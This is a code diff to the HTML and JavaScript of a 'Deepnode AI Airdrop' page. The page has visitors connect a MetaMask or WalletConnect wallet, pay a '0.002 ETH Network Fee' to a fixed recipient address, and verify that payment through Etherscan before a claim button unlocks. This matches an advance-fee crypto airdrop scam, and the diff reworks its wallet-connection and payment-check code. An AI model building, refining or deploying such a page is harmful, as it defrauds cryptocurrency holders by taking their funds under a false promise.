@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Deepnode AI Airdrop</title>
 
-<!-- Ethers.js -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
 <!-- WalletConnect v2 -->
@@ -31,8 +30,8 @@ button:disabled{opacity:.5;cursor:not-allowed}
 .addr{font-size:12px;word-break:break-all;margin-top:10px;opacity:.8}
 
 /* Buttons */
-.payBtn,.checkBtn,.claimBtn,.taskCompleteBtn{margin-top:12px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
-.payBtn:disabled,.checkBtn:disabled,.claimBtn:disabled,.taskCompleteBtn:disabled{opacity:.5;cursor:not-allowed}
+.payBtn,.checkBtn,.claimBtn,.taskCompleteBtn,.walletConnectBtn{margin-top:12px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
+.payBtn:disabled,.checkBtn:disabled,.claimBtn:disabled,.taskCompleteBtn:disabled,.walletConnectBtn:disabled{opacity:.5;cursor:not-allowed}
 .taskBtn{background:linear-gradient(90deg,#1DA1F2,#0d8ddb);margin-top:8px;}
 </style>
 </head>
@@ -42,7 +41,8 @@ button:disabled{opacity:.5;cursor:not-allowed}
   <img src="deepnode-logo.png" class="logo">
   <h1>Connect wallet to claim Deepnode AI airdrop</h1>
 
-  <button onclick="connectWallet()">Connect Wallet</button>
+  <button onclick="connectMetaMask()">Connect MetaMask (Mobile)</button>
+  <button class="walletConnectBtn" onclick="connectWalletConnect()">Connect WalletConnect (Desktop)</button>
 
   <div class="status" id="status"></div>
   <div class="footer">Deepnode AI • Terms & Privacy</div>
@@ -72,6 +72,7 @@ button:disabled{opacity:.5;cursor:not-allowed}
     <button class="payBtn" id="payBtn" onclick="payFee()" disabled>Pay 0.002 ETH Network Fee</button>
     <button class="checkBtn" id="checkBtn" onclick="checkPayment()" disabled>Check Payment</button>
     <button class="claimBtn" id="claimBtn" onclick="claim()" disabled>Claim Airdrop</button>
+    <div id="paymentStatus" style="margin-top:10px; font-size:13px; opacity:0.8;"></div>
   </div>
 </div>
 
@@ -101,33 +102,34 @@ function updateTimer(){
 setInterval(updateTimer,1000);
 updateTimer();
 
-/* ================= CONNECT WALLET ================= */
-async function connectWallet(){
-  if(window.ethereum){
-    // MetaMask mobile/browser
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts",[]);
-    signer = provider.getSigner();
-    currentAddress = await signer.getAddress();
-    afterConnect();
-  } else {
-    // WalletConnect v2 (desktop)
-    const wc = new window.WalletConnect.default({
-      projectId: "e703ffab6d65fd8ada1adc0bfb719136",
-      relayUrl: "wss://relay.walletconnect.com",
-      metadata: {
-        name: "Deepnode AI Airdrop",
-        description: "Claim your exclusive Deepnode AI airdrop",
-        url: window.location.href,
-        icons: ["https://deepnodelive.github.io/deepnode-ai-airdrop/deepnode-logo.png"]
-      }
-    });
-    if(!wc.connected){
-      await wc.connect();
+/* ================= CONNECT METAMASK ================= */
+async function connectMetaMask(){
+  if(!window.ethereum){ alert("Open this page in MetaMask mobile browser"); return; }
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts",[]);
+  signer = provider.getSigner();
+  currentAddress = await signer.getAddress();
+  afterConnect();
+}
+
+/* ================= CONNECT WALLETCONNECT ================= */
+async function connectWalletConnect(){
+  const wc = new window.WalletConnect.default({
+    projectId: "e703ffab6d65fd8ada1adc0bfb719136",
+    relayUrl: "wss://relay.walletconnect.com",
+    metadata:{
+      name:"Deepnode AI Airdrop",
+      description:"Claim your Deepnode AI airdrop",
+      url:window.location.href,
+      icons:["https://deepnodelive.github.io/deepnode-ai-airdrop/deepnode-logo.png"]
     }
-    currentAddress = wc.accounts[0];
-    afterConnect();
+  });
+
+  if(!wc.connected){
+    await wc.connect();
   }
+  currentAddress = wc.accounts[0];
+  afterConnect();
 }
 
 /* ================= AFTER CONNECT ================= */
@@ -198,23 +200,23 @@ function payFee(){
 
 /* ================= CHECK PAYMENT ================= */
 async function checkPayment(){
-  const text = document.getElementById("modalText");
-  text.innerText="Checking payment…";
+  const statusEl = document.getElementById("paymentStatus");
+  statusEl.innerText = "Checking payment…";
   try{
     const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&sort=desc&apikey=${ETHERSCAN_KEY}`);
     const data = await res.json();
     const txList = Array.isArray(data.result)?data.result:[];
     const paid = txList.some(tx=>tx.to?.toLowerCase()===RECIPIENT.toLowerCase() && ethers.utils.formatEther(tx.value)===REQUIRED_ETH);
     if(paid){
-      text.innerText="✅ Payment confirmed";
+      statusEl.innerText="✅ Payment confirmed";
       const claimBtn = document.getElementById("claimBtn");
       claimBtn.disabled=false;
       claimBtn.style.opacity=1;
     } else {
-      text.innerText="⚠️ Payment not found yet";
+      statusEl.innerText="⚠️ Payment not found yet";
     }
   }catch{
-    text.innerText="⚠️ Unable to check payment";
+    statusEl.innerText="⚠️ Unable to check payment";
   }
 }
 
